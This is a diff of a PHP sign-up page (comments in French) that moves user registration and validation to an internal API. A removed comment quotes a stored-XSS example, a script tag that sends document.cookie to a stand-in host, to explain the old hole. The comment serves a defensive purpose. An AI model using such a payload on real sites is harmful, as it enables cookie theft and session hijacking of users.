@@ -1,5 +1,11 @@
 <?php
-require "config.php";
+// AVANT : cette page insérait elle-même le nouvel utilisateur dans la
+// base. MAINTENANT : elle appelle l'API (API/register.php), qui est
+// la seule à écrire dans la table "users". La validation (format du
+// pseudo, longueur du mot de passe) est maintenant faite côté API,
+// donc elle s'applique aussi si le launcher appelle un jour cette
+// route directement.
+require "api_client.php";
 require "safe_redirect.php";
 
 $location = safe_redirect_target($_GET['cameFrom'] ?? null);
@@ -9,36 +15,24 @@ $errorMessage = "";
 
 if ($_POST) {
 
-    $username = trim($_POST["username"]);
-    $password = $_POST["password"];
+    $username = trim($_POST["username"] ?? "");
+    $password = $_POST["password"] ?? "";
 
-    // AVANT : aucune règle sur le username -> un pseudo comme
-    // <script>document.location='https://vol-de-cookies.com/'+document.cookie</script>
-    // était accepté et ensuite ré-affiché tel quel ailleurs sur le site (XSS stocké).
-    // On restreint maintenant aux lettres/chiffres/underscore/tiret, 3 à 20 caractères.
-    if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
-        die("Le nom d'utilisateur doit contenir entre 3 et 20 caractères (lettres, chiffres, _ ou -).");
-    }
+    $result = api_request("register.php", "POST", [
+        "username" => $username,
+        "password" => $password,
+    ]);
 
-    // AVANT : aucune exigence de longueur/robustesse sur le mot de passe.
-    if (strlen($password) < 8) {
-        die("Le mot de passe doit contenir au moins 8 caractères.");
-    }
-
-    $stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
-    $stmt->bind_param("s", $username);
-    $stmt->execute();
-    $result = $stmt->get_result();
-
-    if ($result->num_rows > 0) {
-        $classeTaken = 'Taken active';
-    } else {
-        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
-
-        $stmt = $conn->prepare("INSERT INTO users (username, password, status) VALUES (?, ?, 'member')");
-        $stmt->bind_param("ss", $username, $hashedPassword);
-        $stmt->execute();
+    if (!empty($result["success"])) {
         $classeRegistered = "registered";
+    } elseif (($result["message"] ?? "") === "username_taken") {
+        $classeTaken = 'Taken active';
+    } elseif (($result["message"] ?? "") === "invalid_username") {
+        $errorMessage = "Le nom d'utilisateur doit contenir entre 3 et 20 caractères (lettres, chiffres, _ ou -).";
+    } elseif (($result["message"] ?? "") === "weak_password") {
+        $errorMessage = "Le mot de passe doit contenir au moins 8 caractères.";
+    } else {
+        $errorMessage = "Une erreur est survenue, réessaie plus tard.";
     }
 
 }
@@ -71,6 +65,7 @@ if ($_POST) {
                 <div class="bottom">
                     <li class="<?php echo $classeTaken; ?>">Username already taken.</li>
                                 <li class="<?php echo $classeRegistered; ?>">You have been registered please go back to the login screen and log in.</li>
+                                <?php if ($errorMessage): ?><li class="Taken active"><?= htmlspecialchars($errorMessage) ?></li><?php endif; ?>
                     <button class="submit" type="submit">SIGN UP</button>                 
                 </div>  
                 <div class="link">
